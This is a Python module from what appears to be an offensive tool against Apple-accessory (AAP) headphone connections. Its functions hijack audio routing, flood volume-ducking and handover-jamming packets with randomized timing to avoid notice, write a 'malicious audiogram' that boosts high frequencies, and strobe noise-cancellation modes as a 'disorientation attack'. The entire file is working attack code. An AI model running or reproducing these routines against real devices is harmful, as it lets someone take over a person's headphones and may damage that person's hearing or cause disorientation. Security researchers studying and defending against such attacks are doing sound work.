from core.connection import AAPConnection
from core.packet_builder import PacketBuilder
import time

class HijackModule:
    def __init__(self, connection: AAPConnection, console=None):
        self.connection = connection
        self.console = console

    def log(self, message):
        if self.console:
            self.console.print(message)
        else:
            print(message)

    def run_smart_routing_hijack(self):
        self.log("[bold red][*] Initiating Smart Routing Hijack...[/bold red]")
        if not self.connection.sock:
             self.log("[red][!] Not connected.[/red]")
             return

        if self.console:
            with self.console.status("[bold red]Hijacking in progress...[/bold red]", spinner="bouncingBar"):
                self._execute_hijack_sequence()
        else:
            self._execute_hijack_sequence()

    def _execute_hijack_sequence(self):
        self.log("[*] Sending 'Owns Connection' (0x06 = 0x01)...")
        pkt_own = PacketBuilder.build_control_command(PacketBuilder.CMD_OWNS_CONNECTION, 0x01)
        self.connection.send(pkt_own)
        time.sleep(0.5)

        self.log("[*] Sending 'Connect Automatically' (0x20 = 0x01)...")
        pkt_auto = PacketBuilder.build_control_command(PacketBuilder.CMD_AUTO_CONNECT, 0x01)
        self.connection.send(pkt_auto)
        time.sleep(0.5)
        
        response = self.connection.receive()
        if response:
            self.log(f"[green][+] Response received:[/green] {response.hex()}")
            self.log("[bold green][+] Hijack Commands Sent Successfully![/bold green]")
        else:
            self.log("[yellow][-] No immediate response. This is common for control commands.[/yellow]")

    def trigger_volume_ducking(self, duration_sec=10, ghost_mode=False):
        mode_str = " (Ghost Mode)" if ghost_mode else ""
        self.log(f"[bold red][*] Triggering 'Volume Ducking'{mode_str}...[/bold red]")
        if not self.connection.sock:
             self.log("[red][!] Not connected.[/red]")
             return
        
        import random
        end_time = time.time() + duration_sec
        try:
            while time.time() < end_time:
                pkt = PacketBuilder.build_volume_ducking_packet(enable=True)
                self.connection.send(pkt)
                
                if ghost_mode:
                    sleep_time = random.uniform(0.5, 3.0)
                    time.sleep(sleep_time)
                else:
                    time.sleep(0.1) 
                
            self.log("[green][+] Volume Ducking attack finished.[/green]")
        except KeyboardInterrupt:
            self.log("[yellow][!] Attack stopped by user.[/yellow]")

    def write_malicious_audiogram(self, boiling_frog=False):
        mode_str = " (Boiling Frog)" if boiling_frog else ""
        self.log(f"[bold red][*] Writing Malicious Audiogram{mode_str}...[/bold red]")
        if not self.connection.sock:
             self.log("[red][!] Not connected.[/red]")
             return
             
        if not self.connection.sock:
             self.log("[red][!] Not connected.[/red]")
             return
        
        if boiling_frog:
            self.log("[dim]Ramping up intensity...[/dim]")
            for i in range(1, 6):
                pkt = PacketBuilder.build_audiogram_payload(boost_high_freq=True)
                self.connection.send(pkt)
                time.sleep(1.5)
                self.log(f"[dim]Intensifying... ({i}/5)[/dim]")
        else:
            pkt = PacketBuilder.build_audiogram_payload(boost_high_freq=True)
            self.connection.send(pkt)
            time.sleep(0.5)
        
        self.log("[green][+] Malicious Audiogram payload sent.[/green]")

    def start_handover_jamming(self, duration_sec=15, adaptive=False):
        mode_str = " (Adaptive)" if adaptive else ""
        self.log(f"[bold red][*] Starting Connection Handover Jamming{mode_str}...[/bold red]")
        if not self.connection.sock:
             self.log("[red][!] Not connected.[/red]")
             return
        
        import random
        end_time = time.time() + duration_sec
        try:
            while time.time() < end_time:
                self.connection.send(PacketBuilder.build_control_command(PacketBuilder.CMD_OWNS_CONNECTION, 0x01))
                
                if adaptive:
                    time.sleep(random.uniform(0.01, 0.15))
                else:
                    time.sleep(0.05)
                    
                self.connection.send(PacketBuilder.build_control_command(PacketBuilder.CMD_AUTO_CONNECT, 0x01))
                
                if adaptive:
                    time.sleep(random.uniform(0.01, 0.15))
                else:
                    time.sleep(0.05)
                
            self.log("[green][+] Handover Jamming finished.[/green]")
        except KeyboardInterrupt:
            self.log("[yellow][!] Jamming stopped by user.[/yellow]")

    def trigger_strobe_anc(self, duration_sec=10):
        self.log("[bold red][*] Triggering Strobe ANC (Disorientation Attack)...[/bold red]")
        if not self.connection.sock:
             self.log("[red][!] Not connected.[/red]")
             return
             
        end_time = time.time() + duration_sec
        try:
            while time.time() < end_time:
                self.connection.send(PacketBuilder.build_control_command(PacketBuilder.CMD_LISTENING_MODE, 0x02))
                time.sleep(0.5)
                self.connection.send(PacketBuilder.build_control_command(PacketBuilder.CMD_LISTENING_MODE, 0x03))
                time.sleep(0.5)
                
            self.log("[green][+] Strobe ANC attack finished.[/green]")
        except KeyboardInterrupt:
            self.log("[yellow][!] Attack stopped by user.[/yellow]")
